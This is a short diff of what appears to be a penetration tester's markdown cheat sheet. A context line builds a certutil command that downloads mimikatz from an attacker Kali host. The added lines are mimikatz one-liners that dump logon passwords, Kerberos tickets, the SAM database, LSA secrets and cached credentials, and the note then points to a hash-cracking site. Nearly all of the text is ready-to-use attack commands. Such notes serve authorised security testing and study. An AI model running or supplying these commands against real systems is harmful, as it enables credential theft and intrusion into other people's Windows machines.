@@ -51,12 +51,18 @@ const command = `certutil -urlcache -split -f http://${KaliIP}:80/mimikatz64.exe
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 ---
-
 ## Quick usage
-
 
 ```
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+
+```
+.\mimikatz.exe "privilege::debug" "sekurlsa::tickets" "lsadump::sam" "exit"
+```
+
+```
+.\mimikatz.exe "privilege::debug" "lsadump::secrets" "lsadump::cache" "exit"
 ```
 
 crackstation.net
